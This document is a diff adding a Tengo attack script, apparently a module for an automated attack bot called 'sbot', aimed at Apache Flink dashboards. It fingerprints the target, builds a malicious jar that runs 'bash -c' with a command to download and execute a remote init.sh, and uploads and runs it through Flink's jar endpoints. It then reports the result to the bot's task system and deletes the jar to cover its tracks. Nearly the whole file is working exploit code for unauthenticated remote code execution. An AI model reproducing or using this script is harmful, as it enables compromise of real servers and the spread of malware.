@@ -1,0 +1,150 @@
+/*
+* This flink.tengo is an attack script that attacks target host by apache flink any jar file upload and run bugs
+*
+*global variable:
+*attackTarget
+*attackScript
+*/
+
+fmt  := import("fmt")
+http := import("http")
+json := import("json")
+text := import("text")
+attack := import("attack")
+
+ApacheFlinkAttackName := "ApacheFlinkAttack"
+ApacheFlinkAttackType := "ApacheFlinkAnyJarUploadAttack"
+AttackInitScriptName := "init.sh"
+apacheFlinkKey := "Apache Flink Web Dashboard"
+
+UA := "GoClient"
+timeoutMS := 10000
+
+host := attackTarget.ip
+port := attackTarget.port
+proto := attackTarget.proto
+
+isSSL := proto == "https" ||port==443
+
+client := http.newHttpClient(host,port,isSSL,timeoutMS)
+
+//check is apache flink
+isApachFlink := func (){
+
+    request := http.newHttpRequest("get","/").addHeader("User-Agent",UA)
+    response := client.send(request)
+
+    content := response.getBodyAsString()
+
+    if content == "" {
+        return false
+    }
+
+    return text.contains(content,apacheFlinkKey)
+}
+
+//try to upload attack jar package
+uploadJar := func() {
+
+    initUrl := attackScript.downloadInitUrl(host,port,AttackInitScriptName)
+    initDownloadCmd := attackScript.initCmdForLinux(initUrl,ApacheFlinkAttackType)
+    cmd := fmt.sprintf("bash,-c,%s",initDownloadCmd)
+
+    jarFilePath := attackScript.makeJarAttackPayload(cmd)
+
+    if jarFilePath == "" {
+        fmt.println("create jar upload file failed...................")
+        return ""
+    }
+
+    request := http.newHttpRequest("post","/jars/upload")
+    request.addHeader("User-Agent",UA)
+    request.addHeader("Content-Type","multipart/form-data; boundary=Sbot+++++FormBoundary+++++++++++++")
+    request.addHeader("Accept","application/json, text/plain, */*")
+    request.upload("JarMain.jar",jarFilePath,"Sbot+++++FormBoundary+++++++++++++")
+
+    res := client.send(request)
+
+    jsonData := json.decode(res.getBodyAsByte())
+
+    if !jsonData || jsonData["errors"]{
+        return ""
+    }
+
+    jarFile :=jsonData["filename"]
+
+    return jarFile[text.last_index(jarFile,"/")+1:]
+}
+
+//try to run attack jar package uploaded
+runJar := func(jarFile) {
+
+    url := fmt.sprintf("/jars/%s/run?entry-class=%s",jarFile,"JarMain")
+
+    jsonData := `{"entryClass":"JarMain","parallelism":null,"programArgs":null,"savepointPath":null,"allowNonRestoredState":null}`
+    request := http.newHttpRequest("post",url)
+    request.addHeader("User-Agent",UA)
+    request.addHeader("Content-Type", "application/json")
+    request.addHeader("Accept","application/json, text/plain, */*")
+    request.putString(jsonData,false)
+
+    res := client.send(request)
+
+    return res.getBodyAsString()
+}
+
+deleteJar := func(jarFile) {
+
+    url := fmt.sprintf("/jars/%s",jarFile)
+    request := http.newHttpRequest("delete",url)
+    request.addHeader("User-Agent",UA)
+
+    client.send(request)
+}
+
+//make attack process and publish into attack tasks and send into sbot
+sendAttackResult := func(result) {
+
+    attackProcess := attack.newAttackProcess()
+    attackProcess.setIP(host)
+    attackProcess.setHost(host)
+    attackProcess.setPort(port)
+    attackProcess.setProto(isSSL?"https":"http")
+    attackProcess.setApp("ApacheFlink")
+    attackProcess.setName(ApacheFlinkAttackName)
+    attackProcess.setType(ApacheFlinkAttackType)
+    attackProcess.setStatus(0)
+    attackProcess.setPayload("upload a jar package")
+    attackProcess.setResult(result)
+    //attackProcess.setDetails("")
+
+    //publish attack process into attack tasks
+    attackScript.pubProcess(attackProcess)
+}
+
+main := func(){
+
+    if isApachFlink() {
+
+        fmt.printf("find a apache application on target:%s:%d,start make a jar package and upload\n",host,port)
+
+        jarFile := uploadJar()
+
+        if jarFile!= "" {
+            fmt.printf("upload jar package to apache flink:%s:%d is ok,returns store filename:%s\n",host,port,jarFile)
+
+            runResult := runJar(jarFile)
+
+            fmt.printf("run jar package on apache flink application,fname:%s,result:%s\n",jarFile,runResult)
+
+            sendAttackResult(runResult)
+
+            deleteJar(jarFile)
+
+            fmt.printf("delete jar package on apache flink application,fname:%s\n",jarFile)
+
+        }
+    }
+}
+
+main()
